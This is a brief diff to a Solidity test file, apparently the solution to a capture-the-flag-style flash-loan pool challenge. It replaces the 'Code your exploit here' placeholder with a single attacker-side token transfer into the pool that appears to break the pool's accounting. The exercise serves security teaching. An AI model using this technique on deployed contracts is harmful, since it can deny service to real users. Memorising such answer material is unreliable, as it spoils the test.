@@ -14,9 +14,7 @@ contract FlashPoolTest is FlashPoolFixture {
         // Start acting as the attacker for the remainder of the exploit
         vm.startPrank(attacker);
 
-        /**
-         * Code your exploit here
-         */
+        token.transfer(address(pool), 1);
 
         // Stop acting like the attacker
         vm.stopPrank();
